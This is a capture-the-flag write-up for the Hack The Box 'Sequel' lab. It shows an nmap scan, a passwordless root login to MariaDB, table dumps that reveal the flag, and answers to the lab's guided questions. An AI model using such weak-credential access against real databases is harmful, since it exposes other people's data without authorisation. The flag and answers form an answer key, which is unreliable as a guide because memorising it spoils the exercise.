```
Platform: HackThebox
Challenge: Sequel
OS: 
Task: Vulnerability Assessment, Databases, MySQL, SQL, Penetration Tester Level 1, Reconnaissance, Weak Credentials
Tools Used: 
Author: Paul B.
```

### Scanning
Nmap Output
```
Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-10 20:38 IST
Nmap scan report for 10.129.95.232
Host is up (0.31s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 66
|   Capabilities flags: 63486
|   Some Capabilities: DontAllowDatabaseTableColumn, Support41Auth, LongColumnFlag, ConnectWithDatabase, IgnoreSigpipes, SupportsCompression, InteractiveClient, Speaks41ProtocolOld, FoundRows, Speaks41ProtocolNew, SupportsTransactions, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, ODBCClient, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: Ir"PLkUHJ{KF]#4w"<H6
|_  Auth Plugin Name: mysql_native_password

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 189.02 seconds
```

### Enumeration
Connect to remote mysql server using following command `mysql -h <Target-IP> -u root`

![HTB - Sequel Mysql 1.png](:/546055f81b624cf99fabb0159b48d26a)

List tables - `show tables;`
```
mysql> show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.16 sec)
```
Fetch data from `users` table - `select * from users;`
```
mysql> select * from users;
+----+----------+------------------+
| id | username | email            |
+----+----------+------------------+
|  1 | admin    | admin@sequel.htb |
|  2 | lara     | lara@sequel.htb  |
|  3 | sam      | sam@sequel.htb   |
|  4 | mary     | mary@sequel.htb  |
+----+----------+------------------+
4 rows in set (0.36 sec)
```
Searching for flag in config table
Fetch data from `config` table - `select * from config;`
```
mysql> select * from config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.16 sec)

```

TASK 1

What does the acronym SQL stand for?
```
Structured Query Language
```

TASK 2

During our scan, which port running mysql do we find?
```
3306
```

TASK 3

What community-developed MySQL version is the target running?
```
Mariadb
```

TASK 4

What switch do we need to use in order to specify a login username for the MySQL service?
```
-u
```

TASK 5

Which username allows us to log into MariaDB without providing a password?
```
root
```

TASK 6

What symbol can we use to specify within the query that we want to display everything inside a table?
```
*
```

TASK 7

What symbol do we need to end each query with?
```
;
```

SUBMIT FLAG

Submit root flag
```
7b4bec00d1a39e3dd4e021ec3d915da8
```
